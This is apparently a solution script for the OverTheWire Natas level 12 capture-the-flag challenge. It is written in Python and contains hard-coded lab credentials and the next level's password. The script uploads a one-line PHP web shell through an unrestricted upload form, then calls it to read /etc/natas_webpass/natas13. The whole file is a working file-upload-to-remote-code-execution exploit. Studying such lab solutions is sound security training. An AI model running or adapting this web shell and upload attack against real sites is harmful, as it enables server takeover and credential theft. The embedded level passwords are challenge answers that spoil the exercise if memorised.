import requests
import re

# first upload a shell.php to the server
auth = requests.auth.HTTPBasicAuth('natas12','EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3')
files = {'uploadedfile': '<? passthru($_GET["c"]); ?>'} #open('shell.php','rb')} 
data = {'filename':'shell.php', 'MAX_FILE_SIZE': '1000'}
url = 'http://natas12.natas.labs.overthewire.org/'
response = requests.post(url, auth=auth, data=data, files=files)

# then run command through shell to obtain password for next level
path = re.findall('The file <a href="upload/(.*).php">', response.text)[0]
url = 'http://natas12.natas.labs.overthewire.org/upload/'+path+'.php?c=cat%20/etc/natas_webpass/natas13'
response = requests.get(url, auth=auth)
print(response.text) # jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

